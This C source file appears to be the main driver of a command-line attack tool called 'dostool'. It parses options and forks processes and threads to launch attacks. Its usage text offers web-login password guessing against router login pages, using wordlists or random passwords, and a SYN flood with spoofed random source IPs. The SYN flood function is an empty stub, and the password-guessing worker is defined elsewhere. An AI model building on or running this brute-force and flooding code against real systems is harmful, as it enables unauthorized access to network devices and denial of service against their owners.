#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/wait.h>
#include <sys/time.h>

#include "main.h"

extern int DisplayDebug(const int message_debug_level, const int user_debug_level, const char *fmt, ...);
extern int DisplayInfo(const char *fmt, ...);
extern int DisplayWarning(const char *fmtsring, ...);
extern int DisplayError(const char *fmt, ...);

static int DisplayUsage(void)
{
    /*
        show the useage info
     */
    char *usage = "\n"
                  "Usage:   dostool [option]\n"
                  "Example: ./dostool -a 0 -u \"JayChou\" -i \"http:\\\\192,168.1.1:80/login.asp\"\n"
                  "         ./dostool -a 0 -U \"/home/test/username.txt\" -P \"/home/test/password.txt\"\n"
                  "         ./dostool -a 0 -u \"JayChou\" -P \"/home/test/password.txt\"\n"
                  "         ./dostool -a 0 -P \"/home/test/password.txt\"\n"
                  "         ./dostool -a 1 -i \"192.168.1.1:80\"\n"
                  "         -i \"http:\\\\192,168.1.1:80/login.asp\"\n\n"
                  "         -a    Indicate attack mode\n"
                  "               0    Guess the web password\n"
                  "               1    Syn flood attack\n\n"
                  "         -u    Indicate user-provided username (default 'admin', must use with -a 0)\n"
                  "         -U    Indicate user-provided username file (must use with -a 0 and -P)\n"
                  "         -P    Indicate user-provided password file (must use with -a 0)\n"
                  "         -r    Indicate random password generate length (default 8)\n"
                  "         -d    Indicate debug level (default 0)\n"
                  "               0    turn off the debug show\n"
                  "               1    show less debug message\n"
                  "               2    show verbose debug message\n"
                  "               3    show all debug message\n\n"
                  "         -p    Set the process number (default 4)\n"
                  "         -t    Set the thread number (default 2)\n"
                  "         -i    Indicate intent URL address (user shoud indicate the port in thr URL)\n"
                  "         -R    Use the random source IP address in dos attack (can not use in the guess password attack)\n"
                  "               0    turn off the random source ip address which can protect in the local net\n"
                  "               1    enable random source ip address (default)\n\n"
                  "         -m    Type of router\n"
                  "               feixun_fwr_604h not_sure\n\n"
                  "         -h    Show this message\n";

    printf("%s", usage);
    return 0;
}

static int CheckInputCompliance(const pInput input)
{
    /*
     * check the compliance of user input
     * like -U must use with -P .etc
     * 
     * return:
     * 0 - check pass
     * 1 - error
     */

    DisplayDebug(DEBUG_LEVEL_3, input->debug_level, "Enter CheckInputCompliance");

    // in the dos attack mode, can not appear 'http' in the address
    if (input->attack_mode != 0)
    {
        if (strstr(input->address, "http"))
        {
            DisplayError("Please check your address, this should not appear http or https");
            return -1;
        }
    }

    // -U must with -P
    if (strlen(input->username_path) > 0)
    {
        if (strlen(input->password_path) == 0)
        {
            DisplayError("Place check your -U paratemer, -U must use with -P");
            return -1;
        }
    }

    DisplayDebug(DEBUG_LEVEL_3, input->debug_level, "Exit CheckInputCompliance");
    return 0;
}

static int ProcessInput(const int argc, char *argv[], pInput input)
{
    /*
        understood the user input meaning
     */
    int i;
    char *ptmp;

    for (i = 1; i < argc; i++)
    {
        ptmp = (char *)strstr(argv[i], "-");
        if (!ptmp)
        {
            printf("Illegal input\n");
            return -1;
        }

        switch (*(ptmp + 1))
        {
        case 'a':
            // int
            if (argv[++i])
            {
                switch (*argv[i])
                {
                case '0':
                    input->attack_mode = GUESS_USERNAME_PASSWORD;
                    break;
                case '1':
                    input->attack_mode = SYN_FLOOD_ATTACK;
                    break;
                default:
                    DisplayWarning("Value of the -a parameter is not allowed, use default value now");
                    input->attack_mode = ATTACK_MODE_DEFAULT;
                    break;
                }
            }
            else
            {
                DisplayWarning("Can not found value of -a parameter, use default value now");
                input->attack_mode = ATTACK_MODE_DEFAULT;
                //return -1;
            }
            break;

        case 'd':
            // int
            if (argv[++i])
            {
                switch (*argv[i])
                {
                case '0':
                    input->debug_level = DEBUG_OFF;
                    break;
                case '1':
                    input->debug_level = DEBUG_LEVEL_1;
                    break;
                case '2':
                    input->debug_level = DEBUG_LEVEL_2;
                    break;
                case '3':
                    input->debug_level = DEBUG_LEVEL_3;
                    break;
                default:
                    DisplayWarning("Value of -d parameter is not allowed, use default value now");
                    input->debug_level = DEBUG_LEVEL_DEFAULT;
                    break;
                }
            }
            else
            {
                DisplayWarning("Can not found value of -d parameter, use default value now");
                input->debug_level = DEBUG_LEVEL_DEFAULT;
                //return -1;
            }
            break;

        case 'u':
            // char
            if (argv[++i])
            {
                strncpy(input->username, argv[i], MAX_USERNAME_LENGTH);
            }
            else
            {
                DisplayError("Can not found value of -u parameter, use the default value now");
                strncpy(input->username, USERNAME_DEFAULT, MAX_USERNAME_LENGTH);
            }
            break;

        case 'U':
            // char
            if (argv[++i])
            {
                strncpy(input->username_path, argv[i], MAX_USERNAME_PATH_LENGTH);
            }
            else
            {
                DisplayError("Can not found value of -U parameter");
                return -1;
            }
            break;

        case 'P':
            // char
            if (argv[++i])
            {
                strncpy(input->password_path, argv[i], MAX_PASSWORD_PATH_LENGTH);
            }
            else
            {
                DisplayError("Can not found value of -P parameter");
                return -1;
            }
            break;

        case 't':
            // int
            if (argv[++i])
            {
                input->max_thread = atoi(argv[i]);
            }
            else
            {
                DisplayWarning("Can not found value of -t parameter, use default value now");
                input->max_thread = THREAD_NUM_DEFAULT;
                //return -1;
            }
            break;

        case 'p':
            // int
            if (argv[++i])
            {
                input->max_process = atoi(argv[i]);
            }
            else
            {
                DisplayWarning("Can not found value of -p parameter, use default value now");
                input->max_process = PROCESS_NUM_DEFAULT;
                //return -1;
            }
            break;

        case 'r':
            // int
            if (argv[++i])
            {
                input->random_password_length = atoi(argv[i]);
            }
            else
            {
                DisplayWarning("Can not found value of -r parameter, use default value now");
                input->random_password_length = RANDOM_PASSWORD_LENGTH_DEFAULT;
                //return -1;
            }
            break;

        case 'i':
            // char
            if (argv[++i])
            {
                strncpy(input->address, argv[i], MAX_URL_LENGTH);
            }
            else
            {
                DisplayError("Can not found value of -i parameter");
                return -1;
            }
            break;

        case 'R':
            // int
            if (argv[++i])
            {
                switch (*argv[i])
                {
                case '0':
                    input->random_sip_address = DISABLE_SIP;
                    break;
                case '1':
                    input->random_sip_address = ENABLE_SIP;
                    break;
                default:
                    DisplayWarning("Value of -R parameter is not allowed, use default value now");
                    input->random_sip_address = ENABLE_SIP;
                    break;
                }
            }
            else
            {
                DisplayWarning("Can not found value of -i parameter, use default value now");
                input->random_sip_address = RANDOM_SIP_DEFAULT;
            }
            break;

        case 'm':
            // char
            if (argv[++i])
            {
                strncpy(input->model_type, argv[i], MAX_MODEL_TYPE_LENGTH);
            }
            else
            {
                DisplayWarning("Can not found value of -m parameter use default value now");
                strncpy(input->model_type, (char *)MODEL_TYPE_DEFAULT, MAX_MODEL_TYPE_LENGTH);
            }
            break;

        case 'h':
            DisplayUsage();
            return 0;

        default:
            DisplayError("Please check you input");
            DisplayUsage();
            return -1;
        }
    }

    return 0;
}

static int Run_Attack_GuessUsernamePassword(pInput input)
{
    // split the big function
    extern int Attack_GuessUsernamePassword(pInput input);
    pthread_t job_tid;
    int ti;
    for (ti = 0; ti < input->max_thread; ti++)
    {
        input->serial_num += ti;
        input->seed += ti;
        int ret = pthread_create(&job_tid, NULL, (void *)Attack_GuessUsernamePassword, input);
        DisplayDebug(DEBUG_LEVEL_2, input->debug_level, "job_tid value: %d", job_tid);
        DisplayDebug(DEBUG_LEVEL_2, input->debug_level, "ret value: %d", ret);

        if (ret != 0)
        {
            DisplayError("Create pthread failed");
            return -1;
        }
        pthread_join(job_tid, NULL);
    }
    return 0;
}

static int Run_Attack_SYNFlood(pInput input)
{
    // run function in thread
    return 0;
}

static int StartAttackJob(const pInput input)
{
    DisplayDebug(DEBUG_LEVEL_3, input->debug_level, "Enter StartAttackJob");
    pid_t job_pid;
    int pi;
    for (pi = 0; pi < input->max_process; pi++)
    {
        DisplayDebug(DEBUG_LEVEL_2, input->debug_level, "pi value: %d", pi);
        job_pid = fork();
        DisplayDebug(DEBUG_LEVEL_2, input->debug_level, "job_pid value: %d", job_pid);
        if (job_pid == 0)
        {
            /* child process */
            DisplayDebug(DEBUG_LEVEL_2, input->debug_level, "attack_mode value: %d", input->attack_mode);
            switch (input->attack_mode)
            {
            case GUESS_USERNAME_PASSWORD:
                // get the random seed
                input->serial_num = pi;
                input->seed = pi;
                Run_Attack_GuessUsernamePassword(input);
                break;

            case SYN_FLOOD_ATTACK:
                /// not finish
                Run_Attack_SYNFlood(input);
                break;
            }
        }
        else if (job_pid < 0)
        {
            // Error now
            DisplayError("Create process failed");
        }
        else
        {
            // Father process
            int wait_val;
            int child_id;
            child_id = wait(&wait_val);
            DisplayDebug(DEBUG_LEVEL_1, input->debug_level, "child exit, process id: %d", child_id);
            if (WIFEXITED(wait_val))
            {
                DisplayDebug(DEBUG_LEVEL_1, input->debug_level, "child exited with code %d", WEXITSTATUS(wait_val));
            }
            else
            {
                DisplayError("Child exited unnormally");
                // sleep() for test
                //sleep(1);
            }
        }
    }

    DisplayDebug(DEBUG_LEVEL_3, input->debug_level, "Exit StartAttackJob");
    return 0;
}

static int InitInput(pInput *p)
{
    // make sure the buff is clean
    (*p) = (pInput)malloc(sizeof(Input));
    if (!(*p))
    {
        DisplayError("Init input malloc failed");
        return -1;
    }
    if (!memset((*p)->address, 0, sizeof((*p)->address)))
    {
        DisplayError("Init input memset failed");
        return -1;
    }
    if (!memset((*p)->username, 0, sizeof((*p)->username)))
    {
        DisplayError("Init input memset failed");
        return -1;
    }
    if (!memset((*p)->username_path, 0, sizeof((*p)->username_path)))
    {
        DisplayError("Init input memset failed");
        return -1;
    }
    if (!memset((*p)->password_path, 0, sizeof((*p)->password_path)))
    {
        DisplayError("Init input memset failed");
        return -1;
    }
    if (!memset((*p)->model_type, 0, sizeof((*p)->model_type)))
    {
        DisplayError("Init input memset failed");
        return -1;
    }

    // field default value
    (*p)->attack_mode = ATTACK_MODE_DEFAULT;
    (*p)->max_process = PROCESS_NUM_DEFAULT;
    (*p)->max_thread = THREAD_NUM_DEFAULT;
    (*p)->debug_level = DEBUG_LEVEL_DEFAULT;
    (*p)->random_password_length = RANDOM_PASSWORD_LENGTH_DEFAULT;
    (*p)->random_sip_address = RANDOM_SIP_DEFAULT;
    if (!strncpy((*p)->username, (char *)USERNAME_DEFAULT, strlen((char *)USERNAME_DEFAULT)))
    {
        DisplayError("Init input strncpy failed");
        return -1;
    }
    if (!strncpy((*p)->model_type, (char *)MODEL_TYPE_DEFAULT, strlen((char *)MODEL_TYPE_DEFAULT)))
    {
        DisplayError("Init input strncpy failed");
        return -1;
    }

    return 0;
}

int main(int argc, char *argv[])
{
    /*
      main function
     */

    if (argc == 1)
    {
        DisplayError("Need more parameter");
        DisplayUsage();
        return -1;
    }

    pInput input;

    if (InitInput(&input))
    {
        DisplayError("Init the input failed");
        return -1;
    }

    // processing the user input data
    if (!ProcessInput(argc, argv, input))
    {
        //DisplayInfo("Running...");
        //DisplayDebug(DEBUG_LEVEL_1, input->debug_level, "Debug mode started...");

        if (input->debug_level > 0)
        {
            DisplayDebug(DEBUG_LEVEL_1, input->debug_level, "Sleep 2s for debug...");
            sleep(2);
        }

        if (!CheckInputCompliance(input))
        {
            /* process user input ready, start attack now */
            StartAttackJob(input);
        }
        else
        {
            DisplayError("Check compliance failed, please check your input");
            DisplayUsage();
            return -1;
        }
    }
    else
    {
        DisplayError("Please check you input");
        DisplayUsage();
    }

    free(input);
    return 0;
}